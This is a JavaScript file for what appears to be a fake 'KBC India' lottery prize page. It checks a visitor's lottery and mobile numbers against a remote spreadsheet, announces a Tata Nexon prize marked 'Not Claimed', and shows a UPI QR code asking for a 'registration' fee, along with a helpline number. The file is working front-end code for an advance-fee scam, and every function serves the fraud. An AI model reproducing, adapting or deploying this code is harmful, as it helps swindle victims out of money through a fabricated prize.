document.getElementById('loginForm').addEventListener('submit', function(event) {
  event.preventDefault();
  
  document.getElementById('loader').style.display = 'block';
  document.getElementById('container').style.opacity = '0.5';
  
  const lotteryNumber = document.getElementById('lotteryNumber').value;
  const mobileNumber = document.getElementById('mobileNumber').value;
  
  fetch('https://sheetbase.co/api/raju/1ZWRT-ZqKIW0IWvFwX4z3hHkPZk8kfaIp6pu2pvYTIQY/sheet1/')
    .then(response => response.json())
    .then(data => {
      const userDetails = data.data.find(user => user.lotteryNumber === lotteryNumber && user.mobileNumber === mobileNumber);
      //const userDetails = data.data.find(item => item.lotteryNumber === lotteryNumber && item.mobileNumber === mobileNumber);
      if (userDetails) {
       document.getElementById('loader').style.display = 'none';
       document.getElementById('container').style.opacity = '1';
       document.getElementById("loginMess").style.display = "inline-block";
       // Display details
       displayDetails(userDetails);
       //Display Numbers Comma
       formatIndianNumber();
        document.getElementById("loginForm").style.display = "none";
        document.getElementById("heading").innerText = "CONGRATULATIONS" + "\n" + userDetails.name;
        document.getElementById("heading").style.background = "#0070cb";
        document.getElementById("heading").style.color = "#fff";
        document.getElementById("heading").style.textDecoration = "none";
        document.getElementById("loginMess").innerText = "Login Successful";
        document.getElementById("loginMess").style.backgroundColor = "#00c04b";
        document.getElementById("loginMessage").style.display = "none";
        var qrText = `upi://pay?pa=${userDetails.upi}&pn=KBC&tn=Welcome to KBC India&cu=INR&am=${userDetails.registrationCharge}`;

      } else {
        document.getElementById('loader').style.display = 'none';
        document.getElementById('container').style.opacity = '1';
        document.getElementById("loginMessage").style.display = "inline-block";
        alert('Details not found. Please check your details.');
        document.getElementById("loginMessage").innerText = "Invalid Details";
        document.getElementById("loginMessage").style.backgroundColor = "red";
      }
    })
    .catch(error => console.error('Error:', error));
});

function displayDetails(userDetails) {
  const detailsDiv = document.getElementById('details');
  detailsDiv.innerHTML = `
    <span style="font-size: 24px; font-weight: 600; background: #00c04b; color: #fff; padding: 2px 25px; border-radius: 5px;">DETAILS:-</span>
    <p>Name: <span style="text-transform: capitalize;">${userDetails.name}</span></p>
    <p>Mobile Number: ${userDetails.mobileNumber}</p>
    <p>Lottery Number: ${userDetails.lotteryNumber}</p>
    <p>Prize Name: Tata Nexon</p>
    <p>Prize Amount: RS. ${userDetails.prizeAmount}</p>
    <!--<p>Registration Fees: RS. <span class="indian-number">${userDetails.registrationCharge}</span></p>-->
    <p>${userDetails.feesType}: Rs. <span class="indian-number">${userDetails.registrationCharge}</span></p>
    <p>State: <span style="text-transform: capitalize;">${userDetails.state}</span></p>
    <p>Prize Status: <span style="color: red;">Not Claimed</span></p>
    <img src="car.jpeg" style="width: 100%; border-radius: 5px; pointer-events: none;"><br><br>
    <div style="border: 2px solid #0070cb; border-radius: 10px; border-sizing: border-box; display: none;">
    <p style="font-size: 15px; background: #0070cb; padding: 5px; color: #fff;">Dear <span style="text-transform: capitalize;">${userDetails.name}</span>, Please continue your process by paying your ${userDetails.feesType} Rs. <span class="indian-number">${userDetails.registrationCharge}</span> in company bank account.</p>
    <img src="https://api.qrserver.com/v1/create-qr-code/?data=upi://pay?pa=${userDetails.upi}%26cu=INR%26am=${userDetails.registrationCharge}" style="width: 200px; padding: 5px; pointer-events: none;"><br>
    <p><span style="color:#fff; background: #0070cb; padding: 5px 15px; border-radius: 5px; pointer-events: none;">SCAN TO PAY</span></p>
    </div>
    <p style="display: none;">--------X--------</p>
    <div style="border: 2px solid #00c04b; border-radius: 10px; border-sizing: border-box;">
    <p style="font-size: 15px; padding: 5px;">*For Any Question or Issue, You Can Call Helpline No. +91 9064553236.</p>
    <p><a href = "tel:+919064553236" style = "padding: 5px 15px; background: #00c04b; text-decoration: none; color: #fff; border-radius: 5px;">CALL NOW</a></p>
    </div>
  `;
}

function formatIndianNumber() {
  var spans = document.querySelectorAll('span.indian-number');
  spans.forEach(function(span) {
    var number = span.textContent;
    var formattedNumber = new Intl.NumberFormat('en-IN').format(number);
    span.textContent = formattedNumber;
  });
}
